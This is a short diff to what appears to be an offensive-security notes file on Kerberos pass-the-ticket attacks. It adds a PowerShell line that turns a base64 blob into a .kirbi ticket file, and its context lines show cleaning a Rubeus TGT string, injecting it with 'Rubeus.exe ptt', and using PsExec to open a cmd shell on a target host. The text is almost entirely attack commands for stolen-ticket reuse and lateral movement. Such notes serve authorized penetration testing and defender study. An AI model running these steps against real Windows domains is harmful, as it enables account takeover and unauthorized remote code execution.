@@ -170,6 +170,9 @@ $base64RubeusTGT.Replace(" ","").replace("`n","")
 Linux:
 tr -d '\n' < tgt.txt | tr -d ' '
 
+Make kirbi ticket from BASE64 blob
+[IO.File]::WriteAllBytes("c:\ok\xxx.kirbi", [Convert]::FromBase64String($xxx))
+
 ```
 5. Pass Ticket converted string: `  .\Rubeus.exe ptt /ticket:$base64RubeusTGT`
 6. If ticket owned has enough permissions try getting shell on target Computer: `  .\PsExec.exe -accepteula \\target_host.contoso.com cmd`
